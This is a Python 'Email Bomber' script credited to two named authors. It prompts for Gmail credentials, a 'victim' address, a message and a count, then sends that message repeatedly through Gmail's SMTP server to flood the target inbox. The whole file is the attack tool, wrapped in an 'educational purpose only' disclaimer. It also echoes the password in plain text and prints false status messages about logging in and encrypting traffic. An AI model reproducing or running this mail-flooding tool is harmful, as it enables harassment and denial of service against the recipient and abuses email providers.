print('  _____ __  __    _    ___ _       ____   ___  __  __ ____  _____ ____  ')
print(' | ____|  \/  |  / \  |_ _| |     | __ ) / _ \|  \/  | __ )| ____|  _ \ ') 
print(' |  _| | |\/| | / _ \  | || |     |  _ \| | | | |\/| |  _ \|  _| | |_) |')
print(' | |___| |  | |/ ___ \ | || |___  | |_) | |_| | |  | | |_) | |___|  _ < ')
print(' |_____|_|  |_/_/   \_\___|_____| |____/ \___/|_|  |_|____/|_____|_| \_\ ')
print('\n')
print('                                                    Authors - HackWithAJ and SudoUday                ')                                                                       
print('\n')
print('                                    !!ALERT!!                                               ')
print('                          !!only for Educational purpose!!                                   ')
print('Tip -  Before using this script enable less secure app acess ')
print('       from senders gmail account ')
print('       Refrence : myaccount.google.com/lesssecureapp     ')

print('\n')
print('Authors are not responsible for any kind of unethical act performed by using this script')
print('Visit this documentation for more information about SMTP : https://docs.python.org/3/library/smtplib.html')
print('Initialising program ..............')
num_count = 0

import smtplib 
try:
    num = int(input("Enter the number of Mails to be sent : "))
except:
    print("Invalid Input! Please try again with a number!!")
print('\n')
print("Number of mail's to be sent is", num)

sender_email = input("Enter your gmail/sender's ID : ")
print("Your gmail ID is : ", sender_email)
print('\n')
password = input("Please enter your password : ")
print("Your gmail ID password is : ",password)
print('\n')
victim_email = input("Enter receiver's gmail id :")
print("Receiver's gmail Id is : ", victim_email)
message = input("Enter your message : ")
print('Message to be sent is : ', message)
print('\n')
print('Login successfuly!!')
print('Encrytping traffic....!')
try:
    for i in range(num):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, victim_email, message)
        num_count+= 1
        print(num_count,"mail sent")
        if num == num_count:
            print(num,'mails have been sent to',victim_email)
        print('This script is powerful use wisely!!')
except:
    print('The infromation you entered is incorrect. Please run the script again!!')
             


